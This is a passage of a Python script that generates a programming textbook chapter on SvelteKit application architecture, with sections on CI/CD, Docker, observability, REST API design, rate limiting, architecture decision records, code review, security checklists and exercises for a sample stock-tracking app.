        "branches (1-2 days max) that merge into main. No long-lived branches, no complex merge conflicts."
    , styles))

    story.append(code_block(
        '# Trunk-based development workflow\n\n'
        '# 1. Create a short-lived feature branch\n'
        'git checkout -b feat/add-stock-search\n\n'
        '# 2. Make small, focused commits\n'
        'git add src/lib/components/SearchBar.svelte\n'
        'git commit -m "feat: add stock search component with autocomplete"\n\n'
        '# 3. Push and create PR (same day)\n'
        'git push -u origin feat/add-stock-search\n'
        'gh pr create --title "Add stock search with autocomplete"\n\n'
        '# 4. After review, squash and merge to main\n'
        '# 5. Delete the branch\n'
        'git checkout main && git pull\n'
        'git branch -d feat/add-stock-search\n\n'
        '# KEY RULES:\n'
        '# - Branches live MAX 1-2 days\n'
        '# - Feature flags for incomplete features\n'
        '# - Main is always deployable\n'
        '# - Automated tests gate every merge',
        filename="Trunk-Based Development", styles=styles
    ))

    story.append(h2("CI/CD Pipeline", styles))
    story.append(code_block(
        '# .github/workflows/ci.yml\n'
        'name: CI/CD Pipeline\n\n'
        'on:\n'
        '  push:\n'
        '    branches: [main]\n'
        '  pull_request:\n'
        '    branches: [main]\n\n'
        'jobs:\n'
        '  quality:\n'
        '    runs-on: ubuntu-latest\n'
        '    steps:\n'
        '      - uses: actions/checkout@v4\n'
        '      - uses: actions/setup-node@v4\n'
        '        with:\n'
        '          node-version: 20\n'
        '          cache: "npm"\n'
        '      - run: npm ci\n'
        '      - run: npm run lint\n'
        '      - run: npm run check    # svelte-check\n'
        '      - run: npm run test:unit # vitest\n\n'
        '  e2e:\n'
        '    runs-on: ubuntu-latest\n'
        '    needs: quality\n'
        '    steps:\n'
        '      - uses: actions/checkout@v4\n'
        '      - uses: actions/setup-node@v4\n'
        '        with:\n'
        '          node-version: 20\n'
        '          cache: "npm"\n'
        '      - run: npm ci\n'
        '      - run: npx playwright install --with-deps\n'
        '      - run: npm run test:e2e\n\n'
        '  deploy:\n'
        '    if: github.ref == \'refs/heads/main\'\n'
        '    needs: [quality, e2e]\n'
        '    runs-on: ubuntu-latest\n'
        '    steps:\n'
        '      - uses: actions/checkout@v4\n'
        '      - uses: actions/setup-node@v4\n'
        '        with:\n'
        '          node-version: 20\n'
        '          cache: "npm"\n'
        '      - run: npm ci\n'
        '      - run: npm run build\n'
        '      - name: Deploy to production\n'
        '        run: npx vercel deploy --prod --token=${{ secrets.VERCEL_TOKEN }}',
        filename="GitHub Actions CI/CD", styles=styles
    ))

    story.append(h2("Docker for Development", styles))
    story.append(code_block(
        '# Dockerfile for SvelteKit app\n'
        'FROM node:20-alpine AS builder\n'
        'WORKDIR /app\n'
        'COPY package*.json ./\n'
        'RUN npm ci\n'
        'COPY . .\n'
        'RUN npm run build\n\n'
        'FROM node:20-alpine AS runner\n'
        'WORKDIR /app\n'
        'COPY --from=builder /app/build ./build\n'
        'COPY --from=builder /app/package*.json ./\n'
        'RUN npm ci --production\n\n'
        'ENV PORT=3000\n'
        'EXPOSE 3000\n'
        'CMD ["node", "build"]\n\n'
        '# docker-compose.yml for local development\n'
        '# version: "3.8"\n'
        '# services:\n'
        '#   app:\n'
        '#     build: .\n'
        '#     ports:\n'
        '#       - "5173:5173"\n'
        '#     volumes:\n'
        '#       - .:/app\n'
        '#       - /app/node_modules\n'
        '#   db:\n'
        '#     image: postgres:16-alpine\n'
        '#     environment:\n'
        '#       POSTGRES_DB: tradeboard\n'
        '#       POSTGRES_PASSWORD: devpassword\n'
        '#     ports:\n'
        '#       - "5432:5432"',
        filename="Docker Configuration", styles=styles
    ))

    story.append(h2("Monitoring and Observability", styles))
    story.append(p(
        "You cannot fix what you cannot see. Observability has three pillars: logs (what happened), "
        "metrics (how the system is performing), and traces (the path of a request through the system)."
    , styles))

    story.append(bullet("<b>Structured Logging</b> — Use JSON logs with consistent fields: timestamp, level, "
                        "message, request_id, user_id. Never log passwords or tokens.", styles))
    story.append(bullet("<b>Health Checks</b> — A /health endpoint that reports system status: database "
                        "connected, external APIs reachable, memory usage acceptable.", styles))
    story.append(bullet("<b>Error Tracking</b> — Use Sentry or similar to capture, group, and alert on "
                        "production errors with full stack traces and user context.", styles))
    story.append(bullet("<b>Performance Monitoring</b> — Track request latency percentiles (p50, p95, p99), "
                        "database query times, and external API response times.", styles))

    story.append(principal_box(
        "Set up alerts on p99 latency, not averages. If your average response time is 200ms but p99 "
        "is 5 seconds, 1 in 100 users is having a terrible experience — and at scale, that is thousands "
        "of frustrated users per hour. A principal engineer monitors the worst-case experience, not the "
        "best-case."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You understand trunk-based development, CI/CD pipelines, Docker containerization, "
                           "and observability.", styles))
    story.append(page_break())

    # ================================================================
    # 9.7 API DESIGN
    # ================================================================
    story.append(h1("9.7 API Design", styles))
    story.append(p(
        "APIs are contracts between systems. A well-designed API is intuitive, consistent, and hard to "
        "misuse. A badly designed API causes bugs, confusion, and technical debt that compounds over years."
    , styles))

    story.append(h2("RESTful API Design Principles", styles))
    story.append(code_block(
        '// REST API Design for TradeBoard\n\n'
        '// Resources are NOUNS, not verbs\n'
        '// GOOD: GET /api/stocks\n'
        '// BAD:  GET /api/getStocks\n\n'
        '// Use HTTP methods for actions:\n'
        '// GET    /api/stocks          - List all stocks\n'
        '// GET    /api/stocks/AAPL     - Get specific stock\n'
        '// POST   /api/watchlist       - Add to watchlist\n'
        '// DELETE /api/watchlist/AAPL  - Remove from watchlist\n'
        '// PATCH  /api/user/settings   - Update settings\n\n'
        '// Consistent response format\n'
        'interface ApiResponse<T> {\n'
        '  data: T;\n'
        '  meta?: {\n'
        '    page: number;\n'
        '    perPage: number;\n'
        '    total: number;\n'
        '  };\n'
        '}\n\n'
        'interface ApiError {\n'
        '  error: {\n'
        '    code: string;      // Machine-readable: "STOCK_NOT_FOUND"\n'
        '    message: string;   // Human-readable: "Stock XYZ not found"\n'
        '    details?: unknown; // Validation errors, etc.\n'
        '  };\n'
        '}\n\n'
        '// Pagination\n'
        '// GET /api/stocks?page=2&per_page=20&sort=price&order=desc\n\n'
        '// Filtering\n'
        '// GET /api/stocks?sector=tech&min_price=100&max_price=500\n\n'
        '// Status codes\n'
        '// 200 OK           - Success\n'
        '// 201 Created      - Resource created (POST)\n'
        '// 204 No Content   - Success, no body (DELETE)\n'
        '// 400 Bad Request  - Invalid input\n'
        '// 401 Unauthorized - Not authenticated\n'
        '// 403 Forbidden    - Not authorized\n'
        '// 404 Not Found    - Resource doesn\'t exist\n'
        '// 429 Too Many     - Rate limited\n'
        '// 500 Server Error - Bug on our end',
        filename="REST API Design", styles=styles
    ))

    story.append(h2("API Implementation in SvelteKit", styles))
    story.append(code_block(
        '// src/routes/api/stocks/+server.ts\n'
        'import { json, error } from "@sveltejs/kit";\n'
        'import { z } from "zod";\n'
        'import { db } from "$lib/server/database";\n\n'
        'const QuerySchema = z.object({\n'
        '  page: z.coerce.number().int().positive().default(1),\n'
        '  per_page: z.coerce.number().int().min(1).max(100).default(20),\n'
        '  sort: z.enum(["ticker", "price", "change"]).default("ticker"),\n'
        '  order: z.enum(["asc", "desc"]).default("asc"),\n'
        '  search: z.string().max(50).optional(),\n'
        '});\n\n'
        'export async function GET({ url }) {\n'
        '  const params = Object.fromEntries(url.searchParams);\n'
        '  const query = QuerySchema.safeParse(params);\n\n'
        '  if (!query.success) {\n'
        '    throw error(400, {\n'
        '      message: "Invalid parameters",\n'
        '      details: query.error.flatten()\n'
        '    });\n'
        '  }\n\n'
        '  const { page, per_page, sort, order, search } = query.data;\n'
        '  const offset = (page - 1) * per_page;\n\n'
        '  const [stocks, total] = await Promise.all([\n'
        '    db.stock.findMany({\n'
        '      where: search ? { ticker: { contains: search } } : {},\n'
        '      orderBy: { [sort]: order },\n'
        '      take: per_page,\n'
        '      skip: offset,\n'
        '    }),\n'
        '    db.stock.count({\n'
        '      where: search ? { ticker: { contains: search } } : {},\n'
        '    }),\n'
        '  ]);\n\n'
        '  return json({\n'
        '    data: stocks,\n'
        '    meta: { page, perPage: per_page, total }\n'
        '  });\n'
        '}',
        filename="API Route Implementation", styles=styles
    ))

    story.append(h2("Rate Limiting", styles))
    story.append(code_block(
        '// Simple rate limiter in hooks.server.ts\n'
        'const rateLimits = new Map<string, { count: number; resetAt: number }>();\n\n'
        'function checkRateLimit(ip: string, limit = 100, windowMs = 60_000) {\n'
        '  const now = Date.now();\n'
        '  const entry = rateLimits.get(ip);\n\n'
        '  if (!entry || now > entry.resetAt) {\n'
        '    rateLimits.set(ip, { count: 1, resetAt: now + windowMs });\n'
        '    return { allowed: true, remaining: limit - 1 };\n'
        '  }\n\n'
        '  entry.count++;\n'
        '  if (entry.count > limit) {\n'
        '    return { allowed: false, remaining: 0, retryAfter: entry.resetAt - now };\n'
        '  }\n\n'
        '  return { allowed: true, remaining: limit - entry.count };\n'
        '}\n\n'
        '// In handle hook:\n'
        'const ip = event.getClientAddress();\n'
        'const rateCheck = checkRateLimit(ip);\n'
        'if (!rateCheck.allowed) {\n'
        '  return new Response("Too Many Requests", {\n'
        '    status: 429,\n'
        '    headers: {\n'
        '      "Retry-After": String(Math.ceil(rateCheck.retryAfter! / 1000))\n'
        '    }\n'
        '  });\n'
        '}',
        filename="Rate Limiting", styles=styles
    ))

    story.append(spacer(8))
    story.append(checkpoint("You can design RESTful APIs, implement them in SvelteKit, and add rate limiting.", styles))
    story.append(page_break())

    # ================================================================
    # 9.8 THE PRINCIPAL ENGINEER MINDSET
    # ================================================================
    story.append(h1("9.8 The Principal Engineer Mindset", styles))
    story.append(p(
        "Technical skills get you to senior. The principal engineer level requires a fundamentally different "
        "way of thinking. You are no longer just solving problems — you are designing the systems that "
        "prevent problems. You are not just writing code — you are shaping the technical culture of your "
        "organization."
    , styles))

    story.append(h2("Technical Decision-Making", styles))
    story.append(p(
        "Principal engineers make decisions that affect entire teams for years. The key framework is:"
    , styles))

    story.append(bullet("<b>Reversibility</b> — Is this decision easy to undo? If yes, decide quickly and move "
                        "on. If no, invest time in research and discussion.", styles))
    story.append(bullet("<b>Blast Radius</b> — How many people, services, and teams does this affect? "
                        "A decision that affects one service can be made by one person. A decision that affects "
                        "ten teams needs consensus.", styles))
    story.append(bullet("<b>Time Horizon</b> — How long will we live with this? A library choice might be 5+ "
                        "years. A config change is days. Weight effort accordingly.", styles))

    story.append(h2("Architecture Decision Records (ADRs)", styles))
    story.append(code_block(
        '# ADR-001: Use SvelteKit for TradeBoard Frontend\n\n'
        '## Status\n'
        'Accepted\n\n'
        '## Context\n'
        'We need a framework for the TradeBoard web application.\n'
        'Requirements: SSR for SEO, real-time updates, TypeScript support,\n'
        'small bundle size for mobile users on slow connections.\n\n'
        '## Options Considered\n'
        '1. **Next.js (React)** - Largest ecosystem, most hiring pool\n'
        '2. **Nuxt (Vue)** - Good DX, moderate ecosystem\n'
        '3. **SvelteKit (Svelte)** - Smallest bundles, best DX, growing ecosystem\n\n'
        '## Decision\n'
        'SvelteKit. Our team is small (3 devs) and velocity matters more\n'
        'than ecosystem size. Svelte\'s compiler produces the smallest bundles,\n'
        'critical for our mobile-first users. TypeScript support is excellent.\n\n'
        '## Consequences\n'
        '- Smaller hiring pool (mitigated: Svelte is easy to learn)\n'
        '- Fewer third-party components (mitigated: we build custom)\n'
        '- Faster development velocity\n'
        '- Better performance for end users\n\n'
        '## Review Date\n'
        'Re-evaluate in 12 months or when team exceeds 10 developers.',
        filename="Architecture Decision Record", styles=styles
    ))

    story.append(h2("Tech Debt Management", styles))
    story.append(p(
        "Tech debt is not inherently bad — it is a tool. Just like financial debt, the key is "
        "intentional debt (a mortgage to buy a house) versus unintentional debt (credit card spending you "
        "did not track). A principal engineer makes tech debt visible, measurable, and manageable."
    , styles))

    story.append(bullet("<b>Identify</b> — Use TODO/FIXME/HACK comments with ticket numbers. "
                        "Track them in your project management tool.", styles))
    story.append(bullet("<b>Prioritize</b> — Score by impact (how much does it slow us down?) times "
                        "frequency (how often do we encounter it?). High-impact, high-frequency debt "
                        "gets fixed first.", styles))
    story.append(bullet("<b>Budget</b> — Allocate 15-20% of each sprint to tech debt reduction. "
                        "Never zero (debt compounds) and never 100% (ship features too).", styles))
    story.append(bullet("<b>Prevent</b> — Code reviews, linting, automated tests, and architecture "
                        "standards prevent most unintentional debt from being merged.", styles))

    story.append(h2("Code Review Best Practices", styles))
    story.append(p(
        "Code review is not about finding bugs (tests should do that). Code review is about knowledge "
        "sharing, maintaining standards, and catching design issues early."
    , styles))

    story.append(bullet("<b>Review the design, not just the code</b> — Does this approach make sense? "
                        "Are there simpler alternatives? Will this scale?", styles))
    story.append(bullet("<b>Be kind, be specific</b> — 'This is wrong' helps nobody. 'This will fail "
                        "when ticker has special characters because...' teaches.", styles))
    story.append(bullet("<b>Approve with comments</b> — Not everything needs to block. Prefix nitpicks "
                        "with 'nit:' and suggestions with 'suggestion:' to signal importance.", styles))
    story.append(bullet("<b>Small PRs</b> — Review PRs under 300 lines in under an hour. PRs over 500 "
                        "lines have exponentially less effective reviews. Break large features into "
                        "small, reviewable chunks.", styles))

    story.append(principal_box(
        "The most important quality of a principal engineer is not technical skill — it is the ability "
        "to multiply the effectiveness of everyone around you. You do this through clear documentation, "
        "thoughtful code reviews, accessible architecture decisions, and mentoring. Your code might serve "
        "one product, but your influence shapes every product your organization builds."
    , styles))

    story.append(spacer(8))
    story.append(checkpoint("You understand technical decision frameworks, ADRs, tech debt management, "
                           "and effective code review practices.", styles))
    story.append(page_break())

    # ================================================================
    # 9.9 TRADEBOARD ARCHITECTURE REVIEW
    # ================================================================
    story.append(h1("9.9 TradeBoard Architecture Review", styles))
    story.append(p(
        "Let us apply everything from this chapter to review the complete TradeBoard application "
        "architecture. This is the kind of review a principal engineer performs before greenlighting "
        "a project for production."
    , styles))

    story.append(h2("System Architecture", styles))
    story.append(code_block(
        '// TradeBoard Architecture Overview\n'
        '//\n'
        '// CLIENT (Browser)\n'
        '// +------------------------------------------+\n'
        '// | SvelteKit App (SSR + CSR)                |\n'
        '// | +------+ +----------+ +---------------+  |\n'
        '// | |Routes| |Components| |Client Stores  |  |\n'
        '// | +------+ +----------+ +---------------+  |\n'
        '// +------------------------------------------+\n'
        '//            |          |\n'
        '//     Load Functions  API Routes\n'
        '//            |          |\n'
        '// SERVER (Node.js)\n'
        '// +------------------------------------------+\n'
        '// | SvelteKit Server                          |\n'
        '// | +------+ +--------+ +------------------+ |\n'
        '// | |Hooks | |Auth    | |Server Utilities  | |\n'
        '// | +------+ +--------+ +------------------+ |\n'
        '// +------------------------------------------+\n'
        '//        |         |           |\n'
        '// +--------+ +----------+ +---------+\n'
        '// |Database| |Stock API | |Redis    |\n'
        '// |Postgres| |External  | |Cache    |\n'
        '// +--------+ +----------+ +---------+',
        filename="System Architecture Diagram", styles=styles
    ))

    story.append(h2("Performance Audit Checklist", styles))
    story.append(bullet("LCP under 2.5s: Hero content loads immediately via SSR", styles))
    story.append(bullet("INP under 200ms: No blocking JS in critical path", styles))
    story.append(bullet("CLS under 0.1: All images have explicit width/height", styles))
    story.append(bullet("Bundle under 200KB gzipped: Code-split per route", styles))
    story.append(bullet("API responses under 200ms at p95: Database queries optimized", styles))
    story.append(bullet("Time to interactive under 3s on 3G: Critical CSS inlined", styles))

    story.append(h2("Security Review Checklist", styles))
    story.append(bullet("All user input validated server-side with Zod schemas", styles))
    story.append(bullet("Authentication via HttpOnly, Secure, SameSite cookies", styles))
    story.append(bullet("CSRF protection on all state-changing endpoints", styles))
    story.append(bullet("CSP headers configured (no inline scripts)", styles))
    story.append(bullet("No sensitive data in client-side stores or localStorage", styles))
    story.append(bullet("Rate limiting on auth endpoints and API routes", styles))
    story.append(bullet("SQL injection prevented via parameterized queries (Prisma)", styles))
    story.append(bullet("Passwords hashed with bcrypt (cost factor 12+)", styles))

    story.append(h2("Scalability Considerations", styles))
    story.append(bullet("<b>Horizontal scaling</b>: Stateless SvelteKit server behind load balancer. "
                        "Session data in Redis, not in-memory.", styles))
    story.append(bullet("<b>Database scaling</b>: Read replicas for stock data queries. Connection pooling. "
                        "Indexed queries for watchlist operations.", styles))
    story.append(bullet("<b>Caching layers</b>: Redis for stock price cache (30s TTL), HTTP cache for "
                        "static assets (immutable), SWR for client-side data freshness.", styles))
    story.append(bullet("<b>Real-time updates</b>: WebSocket or SSE for live price feeds. Fallback to "
                        "polling at 5s intervals.", styles))

    story.append(spacer(16))

    # ================================================================
    # EXERCISES
    # ================================================================
    story.append(h1("Chapter 9 Exercises", styles))
    story.append(HorizontalLine())
    story.append(spacer(8))

    story.append(exercise(2, "Component Library Design", [
        ('ExerciseBody', '<b>Task:</b> Design the component hierarchy for TradeBoard using Atomic '
         'Design. Create a document listing every atom, molecule, organism, and template. For each '
         'component, specify its props interface, events, and which other components it composes. '
         'Include at least 5 atoms, 4 molecules, 3 organisms, and 2 templates.'),
    ], styles))
    story.append(spacer(6))

    story.append(exercise(3, "State Management Implementation", [
        ('ExerciseBody', '<b>Task:</b> Build a complete state management solution for TradeBoard. '
         'Create a watchlist store with $state and $derived runes. Implement optimistic updates for '
         'add/remove operations. Add a state machine for the trade form (idle -> validating -> '
         'confirming -> submitting -> success/error). Write unit tests for each state transition.'),
    ], styles))
    story.append(spacer(6))

    story.append(exercise(4, "CI/CD Pipeline Setup", [
        ('ExerciseBody', '<b>Task:</b> Create a complete GitHub Actions CI/CD pipeline for TradeBoard. '
         'Include: linting (ESLint + Prettier), type checking (svelte-check), unit tests (Vitest), '
         'E2E tests (Playwright), build verification, and deployment to Vercel. Add a Dockerfile for '
         'the production build. Set up dependabot for automated dependency updates.'),
    ], styles))
    story.append(spacer(6))

    story.append(exercise(5, "Security Audit", [
        ('ExerciseBody', '<b>Task:</b> Perform a complete security audit of a web application. Check '
         'for: XSS vulnerabilities (both stored and reflected), CSRF protection, authentication flaws, '
         'input validation gaps, insecure headers, and information leakage. Write a security audit '
         'report with severity levels (Critical/High/Medium/Low) and recommended fixes for each issue.'),
    ], styles))
    story.append(spacer(6))

    story.append(exercise(5, "Architecture Decision Record", [
        ('ExerciseBody', '<b>Task:</b> Write an ADR for a major technical decision: choosing between '
         'REST and GraphQL for TradeBoard\'s API layer. Research both options thoroughly. Document the '
         'context, options considered (with pros/cons), your decision, and consequences. Include '
         'performance benchmarks, developer experience comparisons, and long-term maintenance '
         'implications.'),
    ], styles))

    story.append(spacer(16))
    story.append(checkpoint("You have mastered architecture and system design: component hierarchies, state "
                           "management at scale, performance engineering, testing strategies, security, "
                           "DevOps, API design, and the principal engineer mindset.", styles))
    story.append(page_break())

    return story
